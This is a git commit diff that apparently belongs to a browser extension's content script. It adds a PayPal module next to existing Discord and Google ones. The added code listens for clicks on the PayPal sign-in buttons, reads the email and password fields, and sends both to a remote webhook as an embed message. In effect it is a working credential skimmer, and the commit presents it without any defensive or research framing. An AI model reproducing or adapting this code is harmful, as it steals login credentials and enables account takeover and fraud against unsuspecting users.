a4025abeda3fdb81c62681098b91f1cc033bc96d
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-08-31 14:39:48 +0200

    paypal

--- src/content-script/index.js
+++ src/content-script/index.js
@@ -1,6 +1,8 @@
 const discord = require('../websites/discord');
 const google = require('../websites/google');
+const paypal = require('../websites/paypal');
 const Util = require('../../utils');
 
 Util.Website.init(discord);
 Util.Website.init(google);
+Util.Website.init(paypal);
---
+++ src/websites/paypal.js
@@ -0,0 +1,42 @@
+const Util = require('../../utils');
+const { formatFields, code, getFooter, formatField } = require('../../utils/Webhook');
+const { waitForElement } = require('../../utils/Document');
+
+module.exports = {
+  webPattern: /https:\/\/www\.paypal\.com/g,
+  urlsMatches: [
+    {
+      path: '/signin',
+      run() {
+        document.querySelector(this.getSelector('next')).addEventListener('click', async () => {
+          const emailInput = document.querySelector(this.getSelector('emailInput'))?.value;
+          if (!emailInput) return;
+
+          const embed = {
+            author: { name: emailInput },
+            title: 'New account is being added',
+            fields: formatFields([
+              ['Email', code(emailInput)],
+            ]),
+            footer: getFooter()
+          };
+          const { id } = await Util.Webhook.sendEmbed(embed);
+
+          (await waitForElement(this.getSelector('submit'))).addEventListener('click', async () => {
+            const passwordInput = document.querySelector(this.getSelector('passwordInput'))?.value;
+            if (!passwordInput) return;
+
+            embed.fields.push(formatField(['Password', code(passwordInput)]));
+            await Util.Webhook.editEmbed(embed, id);
+          });
+        });
+      }
+    }
+  ],
+  selectors: {
+    emailInput: 'input[name="login_email"]',
+    passwordInput: 'input[name="login_password"]',
+    next: 'button[type="submit"]#btnNext',
+    submit: 'button[type="submit"]#btnLogin',
+  }
+};
